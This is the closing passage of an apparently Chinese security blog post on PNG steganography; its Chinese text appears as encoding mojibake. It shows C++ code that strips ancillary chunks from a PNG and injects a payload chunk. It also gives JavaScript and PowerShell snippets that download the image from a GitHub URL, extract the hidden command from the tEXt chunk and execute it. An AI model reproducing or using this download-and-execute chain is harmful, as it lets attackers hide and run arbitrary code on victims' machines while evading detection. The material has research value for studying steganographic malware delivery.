	buf[len+9]=0XC4;
	buf[len+10]=0X08;
	buf[len+11]=0X76;
	fwrite(buf,len+12,1,fp);
}

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	AddPayload(fpnew);
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
</code></pre></div></div>

<p>ä½¿ç”¨check.cppå¯¹å…¶è¿›è¡Œæ ¡éªŒï¼Œå¦‚å›¾ï¼Œæ ¡éªŒæˆåŠŸ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-12.PNG" alt="Alt text" /></p>

<h2 id="0x07-è¯»å–payloadå¹¶æ‰§è¡Œ">0x07 è¯»å–payloadå¹¶æ‰§è¡Œ</h2>
<hr />
<p>å°†æ·»åŠ payloadçš„å›¾ç‰‡ä¸Šä¼ è‡³githubï¼Œåœ¨å®¢æˆ·ç«¯å®ç°è¯»å–å›¾ç‰‡è§£æpayloadå¹¶æ‰§è¡Œï¼š</p>

<h3 id="1javascript">1ã€javascript</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.SetTimeouts(0, 0, 0, 0);
h.Open("GET","https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png",false);
h.Send();
Data = h.ResponseText;
x=Data.indexOf("tEXt");
y=Data.indexOf("IEND");
str=Data.substring(x+4,y-8);
new ActiveXObject("WScript.Shell").Run(str); 
</code></pre></div></div>

<h3 id="2powershell">2ã€powershell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$url = 'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'
$request = New-Object System.Net.WebCLient
$bytes = $request.DownloadString($url)
$x=$bytes.indexof("tEXt")
$y=$bytes.indexof("IEND")
$str=$bytes.Substring($x+4,$y-$x-12)
Start-Process -FilePath $str
</code></pre></div></div>

<p><strong>æ³¨:</strong></p>

<p>è¿™é‡Œç»™å‡ºä¸¤ç§æ–¹æ³•ï¼Œä»…ä½œæ¼”ç¤º</p>

<h2 id="0x08-å°ç»“">0x08 å°ç»“</h2>
<hr />
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»åˆ†æäº†PNGæ–‡ä»¶çš„æ ¼å¼ï¼Œç¼–å†™ç¨‹åºå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p>

<ul>
  <li>
    <p>è‡ªåŠ¨è§£æPNGæ–‡ä»¶æ ¼å¼ï¼Œè¾…åŠ©æŸ¥æ‰¾å…¶ä¸­çš„éšè—å†…å®¹</p>
  </li>
  <li>
    <p>æ·»åŠ Payload</p>
  </li>
  <li>
    <p>ä¸‹è½½PNGå›¾ç‰‡è§£æå¹¶æ‰§è¡Œpayload</p>
  </li>
</ul>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET